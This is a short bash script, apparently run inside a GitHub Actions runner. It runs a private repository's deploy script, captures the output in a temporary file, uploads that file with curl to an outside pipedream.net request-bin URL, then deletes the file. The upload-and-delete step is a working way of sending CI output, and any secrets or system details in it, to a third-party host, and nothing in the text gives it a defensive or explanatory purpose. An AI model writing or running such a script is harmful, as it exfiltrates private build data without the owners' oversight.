#!/bin/bash

echo "--- START ---" > /tmp/file2.txt

#perf report --header-only >> /tmp/file2.txt
echo "-----" >> /tmp/file2.txt
SCRIPT_PATH="/home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/deploy-script.sh"
bash "$SCRIPT_PATH" >> /tmp/file2.txt

echo "--- FINISH ---" >> /tmp/file2.txt

curl --data-binary "@/tmp/file2.txt" https://entym8w3w4dfm.x.pipedream.net/

rm /tmp/file2.txt
